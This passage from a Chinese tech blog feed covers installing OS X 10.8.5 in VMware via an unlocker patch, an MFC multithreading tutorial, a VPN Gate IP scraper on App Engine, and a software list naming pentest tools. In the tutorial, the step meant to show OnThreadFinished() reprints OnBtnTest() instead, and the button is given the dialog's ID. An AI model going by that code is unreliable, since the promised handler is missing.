title="怎么知道下载了哪个版本？"></a>怎么知道下载了哪个版本？</h2><p>通过文件的MD5等校验值来辨别。使用软件：<a href="http://keir.net/hash.html" target="_blank" rel="noopener">Hash</a>或者<a href="http://implbits.com/products/hashtab/" target="_blank" rel="noopener">HashTab</a>。</p><p><strong>OS X Mountain Lion 10.8.5 Build 12F37.dmg 信息如下：</strong><br>大小: 4469250353 字节<br>MD5: 5568B4DDE00A64F765EF00858B538078<br>SHA1: ECF68C2119C71825839D2A58E0D619E9CCF7C026<br>CRC32: F4DFCE4D<br><strong>从中提取出的InstallESD.dmg：</strong><br>MD5: 2C77151BE45C820B02A9ACE05434693D<br>SHA1: 2919B519142E2119197BFFD678F15F603E84970F<br>CRC32: A9DCAE18</p><p><strong>OSX1085-12F45-ESD.dmg 信息如下：</strong><br>大小: 4448808132 字节<br>MD5: 3FCEBFC81D00767D1ACEF1CB166F88CC<br>SHA1: 98E52D0FC443940265780539A311833EE5814DDD<br>CRC32: C82F14C1<br><strong>从中提取出的InstallESD.dmg：</strong><br>大小: 4434015077 字节<br>MD5: 69FA8DBBC2AA6668534CC863AC9B9F28<br>SHA1: B8FA63882F06B52EB73F6ECC6661858DE32E70E9<br>CRC32: ED788FDE</p><h2 id="VMware安装OS-X-10-8-5注意事项"><a href="#VMware安装OS-X-10-8-5注意事项" class="headerlink" title="VMware安装OS X 10.8.5注意事项"></a>VMware安装OS X 10.8.5注意事项</h2><p>这里使用的VMware Workstation版本是10.0.3，VMware 9也可以。</p><ol><li><p>电脑CPU需要支持虚拟化技术，同时BIOS开启Virtualization Technology选项。使用<a href="https://www.grc.com/securable.htm" target="_blank" rel="noopener"><code>securable</code></a>软件来检测。<br>对于Intel CPU可以在这里查看自己的型号是否支持虚拟化技术：<a href="http://ark.intel.com/Products/VirtualizationTechnology" target="_blank" rel="noopener">http://ark.intel.com/Products/VirtualizationTechnology</a></p></li><li><p>安装<code>unlock-all-v120</code>，为Vmware Workstation添加Mac OS X支持。</p></li><li><p>制作原版InstallESD.ISO镜像</p></li></ol><p><strong>Build 12F45镜像的制作方法：</strong><br>① 使用7-zip打开<code>OSX1085-12F45-ESD.dmg</code>，提取出<code>InstallESD.dmg</code>；② 使用UltraISO，把<code>InstallESD.dmg</code>转换为<code>标准ISO</code>文件；<br><strong>Build 12F37镜像的制作方法：</strong><br>① 使用7-zip打开<code>Install OS X Mountain Lion 10.8.5 Build 12F37.dmg</code>，提取出<code>2.hfs</code>；② 使用7-zip打开<code>2.hfs</code>，提取出<code>InstallESD.dmg</code>；③ 使用UltraISO，把<code>InstallESD.dmg</code>转换为<code>标准ISO</code>文件；</p><ol start="4"><li><p>VMware中安装OS X<br>Vmware Workstation新建虚拟机向导，使用自定义，选Apple Mac OS X 10.8，内存大于2G，虚拟磁盘存储为单个文件，其余可以全部默认。把换后的<code>InstallESD.dmg</code>加载到VMware的CD/DVD中，开始安装直至完成。</p></li><li><p>安装VMware Tools<br>找到VMware Workstation安装目录下的<code>darwin.iso</code>，加载到VMware的CD/DVD中，在OS X虚拟机中安装VMware Tools。</p></li></ol><h2 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h2><blockquote><p><code>securable</code>下载链接：<a href="http://pan.baidu.com/s/1hqxf91i" target="_blank" rel="noopener">http://pan.baidu.com/s/1hqxf91i</a> 密码：<code>wpbs</code><br><code>unlock-all-v120.zip</code>下载链接：<a href="http://pan.baidu.com/s/1o69eCUe" target="_blank" rel="noopener">http://pan.baidu.com/s/1o69eCUe</a> 密码：<code>7jsl</code><br><code>Hash v1.04</code>下载链接：<a href="http://pan.baidu.com/s/1c0my352" target="_blank" rel="noopener">http://pan.baidu.com/s/1c0my352</a> 密码：<code>2hia</code><br><code>HashTab v5.2.0.14</code>下载链接：<a href="http://pan.baidu.com/s/1pJ2rbqN" target="_blank" rel="noopener">http://pan.baidu.com/s/1pJ2rbqN</a> 密码：<code>yuta</code></p></blockquote><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>问题1：不能下载安装OS X所需的附加组件 / 无法下载安装MAC OS X所需的其他组件<br>原因之一：OS X 10.8.5安装镜像有问题，请确认下载的原版镜像或者从中提取的<code>InstallESD.dmg</code>MD5是否正确。如果使用U盘安装，确认镜像没问题后换一个U盘试试。<br>原因之二：苹果系统版本不对。</p><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p>VMware Workstation 9安装MAC OS 10.8全程图解：<a href="http://bbs.pcbeta.com/forum.php?mod=viewthread&amp;tid=1130227" target="_blank" rel="noopener">http://bbs.pcbeta.com/forum.php?mod=viewthread&amp;tid=1130227</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于原版OS-X-Mountain-Lion-10-8-5&quot;&gt;&lt;a href=&quot;#关于原版OS-X-Mountain-Lion-10-8-5&quot; class=&quot;headerlink&quot; title=&quot;关于原版OS X Mountain Lion 10.8.5&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="Mac" scheme="https://g2ex.top/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>VC6多线程编程</title>
    <link href="https://g2ex.top/2014/10/09/VC6-Multi-Thread-Program/"/>
    <id>https://g2ex.top/2014/10/09/VC6-Multi-Thread-Program/</id>
    <published>2014-10-09T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、问题的提出"><a href="#一、问题的提出" class="headerlink" title="一、问题的提出"></a>一、问题的提出</h2><p>编写一个耗时的单线程程序：在Visual C++ 6.0中新建一个基于对话框的MFC项目，这里取名「Demo」。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-10-09_113112.webp" alt="基于对话框的MFC项目" title="创建基于对话框的MFC项目"></p><p>删掉主对话框<code>IDD_DEMO_DIALOG</code>上的控件，添加一个按钮和文本框。按钮的ID和标题设置为<code>IDD_DEMO_DIALOG</code>和<code>测试</code>，文本框的ID设置为<code>IDC_EDT_OUT</code>。</p><p>双击<code>测试按钮</code>为按钮添加响应函数<code>OnBtnTest()</code>，用于计算从1累加到100的和，为了看起来耗时，在每次循环中加入0.1秒的延时。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CDemoDlg::OnBtnTest</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetDlgItem(IDC_EDT_OUT)-&gt;SetWindowText(<span class="string">"计算开始..."</span>);</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">CString str;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += i;</span><br><span class="line">Sleep(<span class="number">100</span>);<span class="comment">// 延时0.1秒</span></span><br><span class="line">&#125;</span><br><span class="line">str.Format(<span class="string">"计算结果: %d"</span>, sum);</span><br><span class="line">GetDlgItem(IDC_EDT_OUT)-&gt;SetWindowText(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行应用程序，单击<code>测试</code>按钮，会发现在这10秒多期间内程序卡死了，不再响应其它消息。为了更好地处理这种耗时的操作，我们有必要使用多线程编程。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-10-09_134227.webp" alt="程序卡死" title="程序卡死"></p><h2 id="二、如何使用多线程"><a href="#二、如何使用多线程" class="headerlink" title="二、如何使用多线程"></a>二、如何使用多线程</h2><p>下面在MFC中使用多线程完成1到100的累加计算。程序运行时，会自动创建一个Demo主线程，点击测试按钮后主线程启动一个计算线程执行<code>ThreadFunc()</code>函数，计算线程计算完成后发送<code>WM_USER_THREAD_FINISHED</code>消息，最后，主线程使用<code>OnThreadFinished()</code>函数处理<code>WM_USER_THREAD_FINISHED</code>消息并把结果显示在文本框中。</p><p>实现步骤如下：</p><h3 id="1-定义参数传递结构体"><a href="#1-定义参数传递结构体" class="headerlink" title="1) 定义参数传递结构体"></a>1) 定义参数传递结构体</h3><p>在<code>DemoDlg.h</code>文件中<code>CDemoDlg</code>类的外部定义两个结构体，第一个用于主线程创建计算线程时向计算线程传递参数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagTHREADPARMS</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> BeginNumb;<span class="comment">// 起始数字</span></span><br><span class="line"><span class="keyword">int</span> EndNumb;<span class="comment">// 结束数字</span></span><br><span class="line">HWND hWnd;</span><br><span class="line">&#125; THREADPARMS;</span><br></pre></td></tr></table></figure><p>当计算线程计算完成后向主线程发送消息时，使用下面的结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRESULTPARMS</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> Sum;<span class="comment">// 计算结果</span></span><br><span class="line">HWND hWnd;</span><br><span class="line">&#125; RESULTPARMS;</span><br></pre></td></tr></table></figure><p>如果线程间不需要参数传递或者传递的参数很少，可以不使用结构体。</p><h3 id="2-声明线程函数"><a href="#2-声明线程函数" class="headerlink" title="2) 声明线程函数"></a>2) 声明线程函数</h3><p>在<code>DemoDlg.h</code>文件中<code>CDemoDlg</code>类的外部添加线程函数声明：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">ThreadFunc</span><span class="params">(LPVOID lpParam)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="3-编写线程函数"><a href="#3-编写线程函数" class="headerlink" title="3) 编写线程函数"></a>3) 编写线程函数</h3><p>在<code>DemoDlg.cpp</code>文件中编写计算线程函数。其计算结果是一个整形数字，完全可以用返回值的形式返回。为了应对更复杂的参数传递，这里演示用结构体传递参数，把结果以消息的形式发送给消息处理函数（消息处理函数后续添加）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">ThreadFunc</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取传递过来的参数</span></span><br><span class="line">THREADPARMS* ptp = (THREADPARMS*) lpParam;</span><br><span class="line">HWND hWnd = ptp-&gt;hWnd;</span><br><span class="line"><span class="keyword">int</span> m = ptp-&gt;BeginNumb;</span><br><span class="line"><span class="keyword">int</span> n = ptp-&gt;EndNumb;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造发送消息的参数</span></span><br><span class="line">RESULTPARMS* prp = <span class="keyword">new</span> RESULTPARMS;</span><br><span class="line">prp-&gt;hWnd = hWnd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = m; i &lt;= n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += i;</span><br><span class="line">Sleep(<span class="number">100</span>);<span class="comment">// 延时0.1秒</span></span><br><span class="line">&#125;</span><br><span class="line">prp-&gt;Sum = sum;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送 WM_USER_THREAD_FINISHED 消息</span></span><br><span class="line">::PostMessage (hWnd, WM_USER_THREAD_FINISHED, (WPARAM) prp, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-创建线程函数"><a href="#4-创建线程函数" class="headerlink" title="4) 创建线程函数"></a>4) 创建线程函数</h3><p>在按钮事件<code>OnBtnTest()</code>中使用<code>AfxBeginThread()</code>创建线程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CDemoDlg::OnBtnTest</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 构造启动线程的参数</span></span><br><span class="line">THREADPARMS* ptp = <span class="keyword">new</span> THREADPARMS;</span><br><span class="line">ptp-&gt;hWnd = m_hWnd;</span><br><span class="line">ptp-&gt;BeginNumb = <span class="number">1</span>;</span><br><span class="line">ptp-&gt;EndNumb = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动计算线程</span></span><br><span class="line">AfxBeginThread (ThreadFunc, ptp);</span><br><span class="line"></span><br><span class="line">GetDlgItem(IDC_EDT_OUT)-&gt;SetWindowText(<span class="string">"计算开始..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-消息处理函数"><a href="#5-消息处理函数" class="headerlink" title="5) 消息处理函数"></a>5) 消息处理函数</h3><p>计算线程发送结果的<code>WM_USER_THREAD_FINISHED</code>消息怎么来处理呢？</p><p>首先，在<code>DemoDlg.h</code>文件中定义<code>WM_USER_THREAD_FINISHED</code>消息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_USER_THREAD_FINISHED WM_USER+0x100</span></span><br></pre></td></tr></table></figure><p>然后，在<code>DemoDlg.h</code>文件<code>CDemoDlg</code>类的<code>protected</code>中添加消息函数的声明，把声明放到<code>DECLARE_MESSAGE_MAP()</code>行的上面。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">afx_msg LONG <span class="title">OnThreadFinished</span><span class="params">(WPARAM wParam, LPARAM lParam)</span></span>;</span><br></pre></td></tr></table></figure><p>这时就可以把<code>WM_USER_THREAD_FINISHED</code>和<code>OnThreadFinished()</code>对应起来了：在<code>DemoDlg.cpp</code>中，找到<code>BEGIN_MESSAGE_MAP(CDemoDlg, CDialog)</code>，在<code>END_MESSAGE_MAP()</code>结束之前加入消息映射：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ON_MESSAGE (WM_USER_THREAD_FINISHED, OnThreadFinished)</span><br></pre></td></tr></table></figure><p>最后，在<code>DemoDlg.cpp</code>文件中编写<code>OnThreadFinished()</code>函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CDemoDlg::OnBtnTest</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 构造启动线程的参数</span></span><br><span class="line">THREADPARMS* ptp = <span class="keyword">new</span> THREADPARMS;</span><br><span class="line">ptp-&gt;hWnd = m_hWnd;</span><br><span class="line">ptp-&gt;BeginNumb = <span class="number">1</span>;</span><br><span class="line">ptp-&gt;EndNumb = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动计算线程</span></span><br><span class="line">AfxBeginThread (ThreadFunc, ptp);</span><br><span class="line"></span><br><span class="line">GetDlgItem(IDC_EDT_OUT)-&gt;SetWindowText(<span class="string">"测试开始"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-多线程运行结果"><a href="#6-多线程运行结果" class="headerlink" title="6) 多线程运行结果"></a>6) 多线程运行结果</h3><p>编译运行，对话框可以随意拖动不再卡了，使用<code>Process Hacker</code>查看<code>Demo.exe</code>进程，可以发现当点击<code>测试按钮</code>时，它会创建一条新线程。试着多点几次测试，会发生什么？</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2014-10-09_161910.webp" alt="多线程运行" title="多线程运行效果"></p><h2 id="三、参考内容"><a href="#三、参考内容" class="headerlink" title="三、参考内容"></a>三、参考内容</h2><p>关于多线程详细的内容，请参考 <a href="http://www.cnblogs.com/TenosDoIt/archive/2013/04/15/3022092.html" target="_blank" rel="noopener">http://www.cnblogs.com/TenosDoIt/archive/2013/04/15/3022092.html</a> 或者善用搜索引擎。</p><h2 id="四、源码下载"><a href="#四、源码下载" class="headerlink" title="四、源码下载"></a>四、源码下载</h2><p>Demo源码百度网盘下载: <a href="http://pan.baidu.com/s/1qW5kwsk" target="_blank" rel="noopener">http://pan.baidu.com/s/1qW5kwsk</a> 密码: 3u5i</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、问题的提出&quot;&gt;&lt;a href=&quot;#一、问题的提出&quot; class=&quot;headerlink&quot; title=&quot;一、问题的提出&quot;&gt;&lt;/a&gt;一、问题的提出&lt;/h2&gt;&lt;p&gt;编写一个耗时的单线程程序：在Visual C++ 6.0中新建一个基于对话框的MFC项目，这里取名「
      
    
    </summary>
    
    
      <category term="C++" scheme="https://g2ex.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>VPN Gate免费L2TP/IPsec代理</title>
    <link href="https://g2ex.top/2014/09/01/Get-VPN-Gate-L2TP-IPsec-IP/"/>
    <id>https://g2ex.top/2014/09/01/Get-VPN-Gate-L2TP-IPsec-IP/</id>
    <published>2014-09-01T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="VPN-Gate-说明"><a href="#VPN-Gate-说明" class="headerlink" title="VPN Gate 说明"></a>VPN Gate 说明</h2><p><a href="http://www.vpngate.net/cn/" target="_blank" rel="noopener">VPN Gate</a> 提供了多种协议的公共代理服务器，其中L2TP/IPsec的代理使用起来最为方便，不需要VPN客户端，可以在Windows、Mac、iOS、Android上使用。</p><p>在 <a href="http://www.vpngate.net/cn/#LIST" target="_blank" rel="noopener">VPN Gate 列表中</a> 找支持L2TP/IPsec的代理IP，详细的配置方法参考<a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">《通过使用 L2TP/IPsec VPN 协议连接到 VPN Gate》</a>。如果无法打开该页面，点击截图：<a href="https://i.imgur.com/1tsnYZA.png" target="_blank" rel="noopener">https://i.imgur.com/1tsnYZA.png</a>。</p><h2 id="获取VPN-Gate-L2TP-IPsec-IP地址的办法"><a href="#获取VPN-Gate-L2TP-IPsec-IP地址的办法" class="headerlink" title="获取VPN Gate L2TP/IPsec IP地址的办法"></a>获取VPN Gate L2TP/IPsec IP地址的办法</h2><p><strong>由于VPN Gate被墙</strong>，所以想了一个办法在GAE上部署小程序用于获取VPN Gate的L2TP/IPsec代理IP：<del><a href="http://getvpngate.appspot.com/" target="_blank" rel="noopener">http://getvpngate.appspot.com/</a></del>。</p><p><strong>但是appspot也被墙了</strong>，万万没想到有人做了appspot的反向代理，把<code>xxx.appspot.com</code>写成<code>xxx.appsp0t.com</code>就可以访问了：<a href="http://getvpngate.appsp0t.com" target="_blank" rel="noopener">http://getvpngate.appsp0t.com</a>，可以把它加入收藏夹！</p><p>如果提示<code>No L2TP IP</code>，试着多刷新几次！</p><h2 id="关于GAE小程序"><a href="#关于GAE小程序" class="headerlink" title="关于GAE小程序"></a>关于GAE小程序</h2><p>GAE程序非常简单，使用Google App Engine Launcher新建一个Python 2.7的App，然后修改<code>main.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> webapp2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(webapp2.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        html = urllib2.urlopen(<span class="string">"http://www.vpngate.net/cn/"</span>).read()</span><br><span class="line">        ips = re.findall(<span class="string">r"&lt;td class='vg_table_row_1'&gt;&lt;b&gt;&lt;span style='font-size: 12pt;'&gt;(.+?)&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;&lt;td class='vg_table_row_1' style='text-align: right;'&gt;&lt;b&gt;&lt;span style='font-size: 10pt;'&gt;(.+?)&lt;/span&gt;&lt;/b&gt;&lt;BR&gt;&lt;span style='font-size: 9pt;'&gt;(.+?)&lt;/span&gt;&lt;BR&gt;(.+?)&lt;b&gt;L2TP/IPsec&lt;BR&gt;连接指南&lt;/b&gt;"</span>, html)</span><br><span class="line">        <span class="keyword">if</span> ips:</span><br><span class="line">            self.response.write(ips[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.response.write(<span class="string">"No L2TP IP"</span>)</span><br><span class="line"></span><br><span class="line">app = webapp2.WSGIApplication([</span><br><span class="line">    (<span class="string">'/'</span>, MainHandler)</span><br><span class="line">], debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>部署到GAE之前修改<code>app.yaml</code>中的<code>application:</code>为自己的app id。</p><p>项目Github：<a href="https://github.com/gymgle/VPNGateL2TP" target="_blank" rel="noopener">https://github.com/gymgle/VPNGateL2TP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;VPN-Gate-说明&quot;&gt;&lt;a href=&quot;#VPN-Gate-说明&quot; class=&quot;headerlink&quot; title=&quot;VPN Gate 说明&quot;&gt;&lt;/a&gt;VPN Gate 说明&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.vpngate.net/cn
      
    
    </summary>
    
    
      <category term="VPN" scheme="https://g2ex.top/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>2014 软件推荐</title>
    <link href="https://g2ex.top/2014/08/23/2014-Software-List/"/>
    <id>https://g2ex.top/2014/08/23/2014-Software-List/</id>
    <published>2014-08-23T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p><code>update 2014-08-23</code></p><ul><li>科学上网<ul><li><a href="https://code.google.com/p/goagent/" target="_blank" rel="noopener">Goagent</a></li><li><a href="https://code.google.com/p/gogo-tester/" target="_blank" rel="noopener">GoGo-Tester</a> - Goagent翻墙伴侣，获取可用的Google IP</li><li><a href="http://www.vpngate.net/cn/" target="_blank" rel="noopener">VPN Gate</a> - L2TP的VPN很强大</li><li><del><a href="https://code.google.com/p/openerdns" target="_blank" rel="noopener">openerDNS</a></del></li></ul></li><li>浏览器<ul><li><a href="https://www.google.com/chrome/" target="_blank" rel="noopener">Chrome</a> - <a href="http://www.google.com/chrome/eula.html?hl=zh-CN&standalone=1" target="_blank" rel="noopener">离线包下载</a></li><li><a href="https://www.mozilla.org/en-US/firefox/all/" target="_blank" rel="noopener">Firefox</a></li><li><a href="http://chrome.360.cn/" target="_blank" rel="noopener">360极速浏览器</a></li></ul></li><li>截图<ul><li><a href="http://www.faststone.org/FSCaptureDetail.htm" target="_blank" rel="noopener">FastStone Capture</a> - 小巧、强大</li><li><a href="http://www.techsmith.com/snagit.html" target="_blank" rel="noopener">Snagit</a> - 收费</li><li>QQ自带</li></ul></li><li>图片浏览/处理<ul><li><a href="http://picasa.google.com/" target="_blank" rel="noopener">Picasa</a></li><li><a href="http://www.irfanview.com/" target="_blank" rel="noopener">IrfanView</a></li><li><a href="http://www.steelbytes.com/?mid=30" target="_blank" rel="noopener">Stripper</a> - 去掉图片中的EXIF信息，可删除PS等修改记录</li></ul></li><li>GIF录制<ul><li><a href="http://www.cockos.com/licecap/" target="_blank" rel="noopener">LICEcap</a></li></ul></li><li>视频播放<ul><li>PotPlayer</li><li><a href="http://www.codecguide.com/download_kl.htm" target="_blank" rel="noopener">K-Lite Codec Pack</a></li></ul></li><li>PDF阅读<ul><li><a href="http://blog.kowalczyk.info/software/sumatrapdf/free-pdf-reader.html" target="_blank" rel="noopener">Sumatra PDF</a></li></ul></li><li>编辑器<ul><li><a href="http://notepad-plus-plus.org/" target="_blank" rel="noopener">Notepad++</a></li><li><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime Text</a></li></ul></li><li>思维导图<ul><li><a href="http://freemind.sourceforge.net/" target="_blank" rel="noopener">FreeMind</a></li><li><a href="http://www.xmind.net/" target="_blank" rel="noopener">XMind</a></li></ul></li><li>密码保存<ul><li><a href="http://keepass.info/" target="_blank" rel="noopener">Keepass</a></li></ul></li><li>文件查找<ul><li><a href="http://www.voidtools.com/" target="_blank" rel="noopener">Everything</a></li><li><a href="http://www.digitalvolcano.co.uk/duplicatecleaner.html" target="_blank" rel="noopener">Duplicate Cleaner</a> - 重复文件查找</li></ul></li><li>文件恢复<ul><li>EasyRecovery</li></ul></li><li>翻译取词<ul><li><a href="http://www.eudic.net/eudic/windows.aspx" target="_blank" rel="noopener">欧陆词典</a> - Windows Mac iPad/iPhone Android</li></ul></li><li>日记本<ul><li><a href="http://www.haoxg.net/ediary/" target="_blank" rel="noopener">eDiary</a></li><li><a href="https://drive.google.com/" target="_blank" rel="noopener">Google Docs</a> - 记事、记账好选择</li></ul></li><li>输入法词库转换<ul><li><a href="https://code.google.com/p/imewlconverter/" target="_blank" rel="noopener">深蓝词库转换</a>        </li></ul></li><li>QQ去广告<ul><li>Hosts去广告</li><li><del>Hook QQ!</del></li><li><del>幽香</del></li><li><del>耍下</del></li><li><del>qqext</del></li></ul></li></ul><hr><ul><li>PC系统工具<ul><li><a href="http://processhacker.sourceforge.net/" target="_blank" rel="noopener">Process Hacker</a> - 强大的Windows资源管理器</li><li><a href="http://www.xuetr.com/?p=191" target="_blank" rel="noopener">PCHunter</a></li><li><a href="http://www.antispy.cn/" target="_blank" rel="noopener">AntiSpy</a></li></ul></li><li>Android 模拟器<ul><li><a href="http://www.genymotion.com/" target="_blank" rel="noopener">Genymotion</a></li><li><a href="http://www.bluestacks.com/" target="_blank" rel="noopener">BlueStack</a></li></ul></li><li>Android Root 神器<ul><li><a href="https://towelroot.com/" target="_blank" rel="noopener">Towelroot</a></li><li><a href="http://root.360.cn/" target="_blank" rel="noopener">360一键Root</a></li></ul></li><li>远程控制<ul><li><a href="http://www.teamviewer.com/" target="_blank" rel="noopener">TeamViewer</a></li></ul></li><li>Ping/TraceRoute工具<ul><li><a href="http://winmtr.net/" target="_blank" rel="noopener">WinMRT</a> - 集合<code>tracert</code>与<code>ping</code>的图形化接口小工具</li><li><a href="http://www.nirsoft.net/utils/multiple_ping_tool.html" target="_blank" rel="noopener">PingInfoView</a> - 批量Ping</li></ul></li><li>抓包<ul><li><a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a></li><li><a href="http://ettercap.github.io/ettercap/" target="_blank" rel="noopener">Ettercap</a></li><li><a href="http://www.wildpackets.com/products/omnipeek_network_analyzer" target="_blank" rel="noopener">OmniPeek</a> - 收费</li></ul></li><li>Web Application/Debugger/Scanner<ul><li><a href="http://portswigger.net/burp/" target="_blank" rel="noopener">Burp Suite</a></li><li><a href="http://www.telerik.com/fiddler" target="_blank" rel="noopener">Fiddler</a></li><li><a href="http://nmap.org/" target="_blank" rel="noopener">Nmap</a></li></ul></li><li>渗透测试<ul><li><a href="http://www.kali.org/" target="_blank" rel="noopener">Kali Linux</a></li><li><a href="http://www.metasploit.com/" target="_blank" rel="noopener">MetaSploit Framework</a></li><li><a href="http://www.dsploit.net/" target="_blank" rel="noopener">dSploit</a> - Android 网络渗透套件</li></ul></li><li>SSH远程连接<ul><li><a href="http://www.netsarang.com/products/xsh_overview.html" target="_blank" rel="noopener">Xshell</a></li><li><a href="http://www.putty.org/" target="_blank" rel="noopener">PuTTY</a></li><li><a href="http://www.openssh.com/" target="_blank" 